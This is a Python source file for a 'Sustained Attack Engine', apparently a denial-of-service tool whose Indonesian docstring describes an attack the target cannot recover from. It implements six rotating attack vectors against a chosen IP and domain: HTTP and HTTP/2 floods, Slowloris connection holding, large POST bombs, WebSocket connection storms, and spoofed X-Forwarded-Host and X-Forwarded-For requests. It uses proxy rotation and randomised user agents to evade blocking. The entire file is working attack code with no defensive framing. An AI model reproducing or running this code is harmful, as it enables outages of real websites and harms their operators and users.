"""
Sustained Attack Engine v8.0
Multi-vector rotation untuk sustained attack yang tidak bisa di-recovery
- HTTP Flood (GET /)
- HTTP/2 Flood (multiplexing)
- Slowloris (slow header)
- POST Bomb (large payload)
- WebSocket Storm (upgrade request)
- Cache Poison (X-Forwarded-Host manipulation)
"""
import asyncio
import logging
import time
import random
import string
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger("sustained_engine")


class AttackVector(Enum):
    """Available attack vectors."""
    HTTP_FLOOD = "http_flood"
    HTTP2_FLOOD = "http2_flood"
    SLOWLORIS = "slowloris"
    POST_BOMB = "post_bomb"
    WEBSOCKET_STORM = "websocket_storm"
    CACHE_POISON = "cache_poison"


@dataclass
class VectorConfig:
    """Configuration for attack vector."""
    vector: AttackVector
    duration: int  # seconds
    connections_per_ip: int
    request_rate: float  # requests per second per connection
    payload_size: int = 0  # bytes
    description: str = ""


# Default vector rotation schedule (360 seconds = 6 minutes)
DEFAULT_VECTOR_SCHEDULE = [
    VectorConfig(
        vector=AttackVector.HTTP_FLOOD,
        duration=60,
        connections_per_ip=50,
        request_rate=10.0,
        description="Normal GET requests with random query strings"
    ),
    VectorConfig(
        vector=AttackVector.HTTP2_FLOOD,
        duration=60,
        connections_per_ip=30,
        request_rate=5.0,
        description="HTTP/2 multiplexing with 100 parallel streams"
    ),
    VectorConfig(
        vector=AttackVector.SLOWLORIS,
        duration=60,
        connections_per_ip=25,
        request_rate=0.067,  # 1 request per 15 seconds
        description="Slow header attack, connection hold 300s"
    ),
    VectorConfig(
        vector=AttackVector.POST_BOMB,
        duration=60,
        connections_per_ip=20,
        request_rate=0.5,
        payload_size=50 * 1024 * 1024,  # 50MB
        description="Large multipart upload, CPU exhaust"
    ),
    VectorConfig(
        vector=AttackVector.WEBSOCKET_STORM,
        duration=60,
        connections_per_ip=40,
        request_rate=2.0,
        description="WebSocket upgrade requests, connection hold"
    ),
    VectorConfig(
        vector=AttackVector.CACHE_POISON,
        duration=60,
        connections_per_ip=35,
        request_rate=8.0,
        description="X-Forwarded-Host manipulation"
    ),
]


class SustainedAttackEngine:
    """Engine for sustained multi-vector attack."""
    
    def __init__(
        self,
        target_ip: str,
        target_domain: str,
        target_port: int = 80,
        use_https: bool = False,
        vector_schedule: Optional[List[VectorConfig]] = None,
        proxies: Optional[List[str]] = None
    ):
        self.target_ip = target_ip
        self.target_domain = target_domain
        self.target_port = target_port
        self.use_https = use_https
        self.vector_schedule = vector_schedule or DEFAULT_VECTOR_SCHEDULE
        self.proxies = proxies or []
        self._proxy_idx = 0
        
        self.current_vector_idx = 0
        self.is_running = False
        self.stats = {
            'total_requests': 0,
            'total_connections': 0,
            'failed_requests': 0,
            'vectors_executed': 0,
            'start_time': 0,
            'current_vector': None
        }
    
    def _next_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        proxy = self.proxies[self._proxy_idx % len(self.proxies)]
        self._proxy_idx += 1
        return proxy
    
    async def start(self):
        """Start sustained attack with vector rotation."""
        logger.info(f"Starting sustained attack on {self.target_ip}:{self.target_port}")
        logger.info(f"Vector schedule: {len(self.vector_schedule)} vectors")
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        
        try:
            while self.is_running:
                # Get current vector
                vector_config = self.vector_schedule[self.current_vector_idx]
                self.stats['current_vector'] = vector_config.vector.value
                
                logger.info(f"Executing vector: {vector_config.vector.value} for {vector_config.duration}s")
                logger.info(f"  {vector_config.description}")
                
                # Execute vector
                await self._execute_vector(vector_config)
                
                self.stats['vectors_executed'] += 1
                
                # Move to next vector
                self.current_vector_idx = (self.current_vector_idx + 1) % len(self.vector_schedule)
                
        except KeyboardInterrupt:
            logger.info("Sustained attack interrupted by user")
        except Exception as e:
            logger.error(f"Sustained attack error: {e}")
        finally:
            self.is_running = False
            self._print_stats()
    
    def stop(self):
        """Stop sustained attack."""
        logger.info("Stopping sustained attack...")
        self.is_running = False
    
    async def _execute_vector(self, config: VectorConfig):
        """Execute single attack vector."""
        if config.vector == AttackVector.HTTP_FLOOD:
            await self._http_flood(config)
        elif config.vector == AttackVector.HTTP2_FLOOD:
            await self._http2_flood(config)
        elif config.vector == AttackVector.SLOWLORIS:
            await self._slowloris(config)
        elif config.vector == AttackVector.POST_BOMB:
            await self._post_bomb(config)
        elif config.vector == AttackVector.WEBSOCKET_STORM:
            await self._websocket_storm(config)
        elif config.vector == AttackVector.CACHE_POISON:
            await self._cache_poison(config)
    
    async def _http_flood(self, config: VectorConfig):
        """HTTP Flood: Normal GET requests with random query strings."""
        import aiohttp
        from aiohttp_socks import ProxyConnector
        
        end_time = time.time() + config.duration
        tasks = []
        proxy_list = self.proxies[:] if self.proxies else [None]
        
        async def flood_worker(proxy_url):
            if proxy_url:
                connector = ProxyConnector.from_url(proxy_url, ssl=False, force_close=False)
            else:
                connector = aiohttp.TCPConnector(ssl=False, force_close=False)
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while time.time() < end_time and self.is_running:
                    try:
                        rand_qs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                        url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/?{rand_qs}"
                        
                        headers = {
                            'Host': self.target_domain,
                            'User-Agent': self._random_user_agent(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        }
                        
                        async with session.get(url, headers=headers) as resp:
                            await resp.read()
                            self.stats['total_requests'] += 1
                        
                        await asyncio.sleep(1.0 / config.request_rate)
                        
                    except Exception as e:
                        self.stats['failed_requests'] += 1
                        logger.debug(f"HTTP flood error: {e}")
        
        for i in range(config.connections_per_ip):
            proxy = proxy_list[i % len(proxy_list)]
            tasks.append(asyncio.create_task(flood_worker(proxy)))
            self.stats['total_connections'] += 1
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _http2_flood(self, config: VectorConfig):
        """HTTP/2 Flood: Multiplexing with parallel streams."""
        try:
            import httpx
        except ImportError:
            logger.warning("httpx not installed, skipping HTTP/2 flood")
            await asyncio.sleep(config.duration)
            return
        
        end_time = time.time() + config.duration
        proxy_list = self.proxies[:] if self.proxies else [None]
        
        async def h2_worker(proxy_url):
            client_kwargs = dict(http2=True, verify=False)
            if proxy_url:
                client_kwargs['proxies'] = proxy_url
            async with httpx.AsyncClient(**client_kwargs) as client:
                while time.time() < end_time and self.is_running:
                    try:
                        url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/"
                        headers = {'Host': self.target_domain}
                        
                        resp = await client.get(url, headers=headers)
                        self.stats['total_requests'] += 1
                        
                        await asyncio.sleep(1.0 / config.request_rate)
                        
                    except Exception as e:
                        self.stats['failed_requests'] += 1
                        logger.debug(f"HTTP/2 flood error: {e}")
        
        tasks = [asyncio.create_task(h2_worker(proxy_list[i % len(proxy_list)])) for i in range(config.connections_per_ip)]
        self.stats['total_connections'] += len(tasks)
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _slowloris(self, config: VectorConfig):
        """Slowloris: Slow header attack, hold connections."""
        end_time = time.time() + config.duration
        
        async def slowloris_worker():
            try:
                reader, writer = await asyncio.open_connection(
                    self.target_ip, self.target_port
                )
                
                # Send initial request line
                writer.write(f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n".encode())
                writer.write(f"Host: {self.target_domain}\r\n".encode())
                await writer.drain()
                
                # Send headers slowly
                while time.time() < end_time and self.is_running:
                    try:
                        header = f"X-{random.randint(1, 999)}: {random.randint(1, 999)}\r\n"
                        writer.write(header.encode())
                        await writer.drain()
                        
                        self.stats['total_requests'] += 1
                        await asyncio.sleep(15)  # Send header every 15 seconds
                        
                    except Exception:
                        break
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                self.stats['failed_requests'] += 1
                logger.debug(f"Slowloris error: {e}")
        
        tasks = [asyncio.create_task(slowloris_worker()) for _ in range(config.connections_per_ip)]
        self.stats['total_connections'] += len(tasks)
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _post_bomb(self, config: VectorConfig):
        """POST Bomb: Large multipart upload."""
        import aiohttp
        from aiohttp_socks import ProxyConnector
        
        end_time = time.time() + config.duration
        proxy_list = self.proxies[:] if self.proxies else [None]
        
        async def post_worker(proxy_url):
            if proxy_url:
                connector = ProxyConnector.from_url(proxy_url, ssl=False)
            else:
                connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=120)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while time.time() < end_time and self.is_running:
                    try:
                        url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/"
                        
                        payload = 'A' * min(config.payload_size, 10 * 1024 * 1024)
                        
                        headers = {
                            'Host': self.target_domain,
                            'Content-Type': 'application/x-www-form-urlencoded',
                        }
                        
                        async with session.post(url, data=payload, headers=headers) as resp:
                            await resp.read()
                            self.stats['total_requests'] += 1
                        
                        await asyncio.sleep(1.0 / config.request_rate)
                        
                    except Exception as e:
                        self.stats['failed_requests'] += 1
                        logger.debug(f"POST bomb error: {e}")
        
        tasks = [asyncio.create_task(post_worker(proxy_list[i % len(proxy_list)])) for i in range(config.connections_per_ip)]
        self.stats['total_connections'] += len(tasks)
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _websocket_storm(self, config: VectorConfig):
        """WebSocket Storm: Upgrade requests, hold connections."""
        end_time = time.time() + config.duration
        
        async def ws_worker():
            try:
                reader, writer = await asyncio.open_connection(
                    self.target_ip, self.target_port
                )
                
                # Send WebSocket upgrade request
                upgrade_req = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.target_domain}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                    f"Sec-WebSocket-Version: 13\r\n\r\n"
                )
                
                writer.write(upgrade_req.encode())
                await writer.drain()
                
                self.stats['total_requests'] += 1
                
                # Hold connection
                while time.time() < end_time and self.is_running:
                    await asyncio.sleep(5)
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                self.stats['failed_requests'] += 1
                logger.debug(f"WebSocket storm error: {e}")
        
        tasks = [asyncio.create_task(ws_worker()) for _ in range(config.connections_per_ip)]
        self.stats['total_connections'] += len(tasks)
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _cache_poison(self, config: VectorConfig):
        """Cache Poison: X-Forwarded-Host manipulation."""
        import aiohttp
        from aiohttp_socks import ProxyConnector
        
        end_time = time.time() + config.duration
        proxy_list = self.proxies[:] if self.proxies else [None]
        
        async def poison_worker(proxy_url):
            if proxy_url:
                connector = ProxyConnector.from_url(proxy_url, ssl=False, force_close=False)
            else:
                connector = aiohttp.TCPConnector(ssl=False, force_close=False)
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while time.time() < end_time and self.is_running:
                    try:
                        url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/"
                        
                        fake_host = f"evil-{random.randint(1000, 9999)}.com"
                        headers = {
                            'Host': self.target_domain,
                            'X-Forwarded-Host': fake_host,
                            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                            'X-Original-URL': f"/{random.randint(1000, 9999)}",
                        }
                        
                        async with session.get(url, headers=headers) as resp:
                            await resp.read()
                            self.stats['total_requests'] += 1
                        
                        await asyncio.sleep(1.0 / config.request_rate)
                        
                    except Exception as e:
                        self.stats['failed_requests'] += 1
                        logger.debug(f"Cache poison error: {e}")
        
        tasks = [asyncio.create_task(poison_worker(proxy_list[i % len(proxy_list)])) for i in range(config.connections_per_ip)]
        self.stats['total_connections'] += len(tasks)
        await asyncio.gather(*tasks, return_exceptions=True)
    
    def _random_user_agent(self) -> str:
        """Generate random user agent."""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        return random.choice(agents)
    
    def _print_stats(self):
        """Print attack statistics."""
        duration = time.time() - self.stats['start_time']
        
        logger.info("--------------------------------------------------------------------------------")
        logger.info("SUSTAINED ATTACK STATISTICS")
        logger.info("--------------------------------------------------------------------------------")
        logger.info(f"Duration          : {duration:.2f} seconds")
        logger.info(f"Vectors executed  : {self.stats['vectors_executed']}")
        logger.info(f"Total requests    : {self.stats['total_requests']}")
        logger.info(f"Total connections : {self.stats['total_connections']}")
        logger.info(f"Failed requests   : {self.stats['failed_requests']}")
        logger.info(f"Success rate      : {(1 - self.stats['failed_requests'] / max(self.stats['total_requests'], 1)) * 100:.2f}%")
        logger.info(f"Avg RPS           : {self.stats['total_requests'] / max(duration, 1):.2f}")
        logger.info("--------------------------------------------------------------------------------")
